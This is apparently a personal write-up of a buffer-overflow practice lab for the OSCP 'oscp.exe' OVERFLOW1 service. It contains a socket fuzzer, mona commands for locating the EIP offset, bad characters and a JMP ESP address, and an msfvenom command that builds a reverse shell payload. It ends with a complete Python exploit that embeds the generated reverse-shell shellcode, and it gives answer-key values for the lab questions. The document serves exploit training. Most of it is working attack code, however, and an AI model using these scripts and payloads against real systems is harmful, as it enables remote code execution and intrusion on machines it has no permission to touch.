# Buffer Overflow Prep

#### RDP

```bash
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.29.171 /workarea
```

#### Mona

```
!mona config -set workingfolder C:\mona\%p
```

#### Script

{% tabs %}
{% tab title="fuzzer.py" %}
```python
import socket
import sys
import time

ip = "10.10.29.171"
port = 1337
timeout = 5

prefix = "OVERFLOW1 "
string = prefix + "A" * 100

while 1:
    # noinspection PyBroadException
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print(f"Fuzzing with {len(string) - len(prefix)} bytes")
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except Exception:
        print(f"Fuzzing crashed at {len(string) - len(prefix)}")
        sys.exit(0)
    string += "A" * 100
    time.sleep(1)

```
{% endtab %}

{% tab title="exploit.py" %}
```python
import socket

ip = "10.10.29.171"
port = 1337
timeout = 5

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

# noinspection PyBroadException
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
except Exception:
    print("Could not connect.")
```
{% endtab %}
{% endtabs %}

#### Cheat Sheet

{% embed url="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst" %}

## Task 2 oscp.exe - OVERFLOW1

```bash
python3 fuzzer.py
# Fuzzing Crashing at 2000
msf-pattern_create -l 2000
# Update payload
python3 exploit.py
```

```bash
# Finding Offset
!mona findmsp -distance 2000
# EIP contains normal pattern : 0x6f43396e (offset 1978)
# Update offset
```

#### What is the EIP offset for OVERFLOW1?

{% hint style="success" %}
`1978`
{% endhint %}

```bash
# Finding Bad Characters
!mona bytearray -b "\x00"
# for x in range(1, 256):
#     print("\\x" + "{:02x}".format(x), end='')
# print()
# Update payload
```

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP>
```

#### In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?

{% hint style="success" %}
`\x00\x07\x2e\xa0`
{% endhint %}

```bash
# Finding a Jump Point
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
# Update retn \xaf\x11\x50\x62
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.20.154 LPORT=4444 \
         EXIFUNC=thread -b "\x00\x07\x2e\xa0" -f c
# Update Payload
```

```python
import socket

ip = "10.10.29.171"
port = 1337
timeout = 5

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbd\xf7\xf8\xb6\xe1\xdb\xdb\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x6e\x0e\x03\x99\xf6\x54\x14\x99\xef\x1b"
"\xd7\x61\xf0\x7b\x51\x84\xc1\xbb\x05\xcd\x72\x0c\x4d\x83\x7e"
"\xe7\x03\x37\xf4\x85\x8b\x38\xbd\x20\xea\x77\x3e\x18\xce\x16"
"\xbc\x63\x03\xf8\xfd\xab\x56\xf9\x3a\xd1\x9b\xab\x93\x9d\x0e"
"\x5b\x97\xe8\x92\xd0\xeb\xfd\x92\x05\xbb\xfc\xb3\x98\xb7\xa6"
"\x13\x1b\x1b\xd3\x1d\x03\x78\xde\xd4\xb8\x4a\x94\xe6\x68\x83"
"\x55\x44\x55\x2b\xa4\x94\x92\x8c\x57\xe3\xea\xee\xea\xf4\x29"
"\x8c\x30\x70\xa9\x36\xb2\x22\x15\xc6\x17\xb4\xde\xc4\xdc\xb2"
"\xb8\xc8\xe3\x17\xb3\xf5\x68\x96\x13\x7c\x2a\xbd\xb7\x24\xe8"
"\xdc\xee\x80\x5f\xe0\xf0\x6a\x3f\x44\x7b\x86\x54\xf5\x26\xcf"
"\x99\x34\xd8\x0f\xb6\x4f\xab\x3d\x19\xe4\x23\x0e\xd2\x22\xb4"
"\x71\xc9\x93\x2a\x8c\xf2\xe3\x63\x4b\xa6\xb3\x1b\x7a\xc7\x5f"
"\xdb\x83\x12\xcf\x8b\x2b\xcd\xb0\x7b\x8c\xbd\x58\x91\x03\xe1"
"\x79\x9a\xc9\x8a\x10\x61\x9a\xbe\xf5\x7d\xc0\xd7\xf7\x7d\xe5"
"\x7b\x71\x9b\x6f\x94\xd7\x34\x18\x0d\x72\xce\xb9\xd2\xa8\xab"
"\xfa\x59\x5f\x4c\xb4\xa9\x2a\x5e\x21\x5a\x61\x3c\xe4\x65\x5f"
"\x28\x6a\xf7\x04\xa8\xe5\xe4\x92\xff\xa2\xdb\xea\x95\x5e\x45"
"\x45\x8b\xa2\x13\xae\x0f\x79\xe0\x31\x8e\x0c\x5c\x16\x80\xc8"
"\x5d\x12\xf4\x84\x0b\xcc\xa2\x62\xe2\xbe\x1c\x3d\x59\x69\xc8"
"\xb8\x91\xaa\x8e\xc4\xff\x5c\x6e\x74\x56\x19\x91\xb9\x3e\xad"
"\xea\xa7\xde\x52\x21\x6c\xee\x18\x6b\xc5\x67\xc5\xfe\x57\xea"
"\xf6\xd5\x94\x13\x75\xdf\x64\xe0\x65\xaa\x61\xac\x21\x47\x18")
postfix = ""

# for i in range(1, 256):
#     if i == 7 or i == 0x2e or i == 0xa0:
#         continue
#     payload += chr(i)

buffer = prefix + overflow + retn + padding + payload + postfix

# noinspection PyBroadException
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
except Exception:
    print("Could not connect.")
```

![](<../../.gitbook/assets/Screenshot from 2021-09-07 11-11-02.png>)
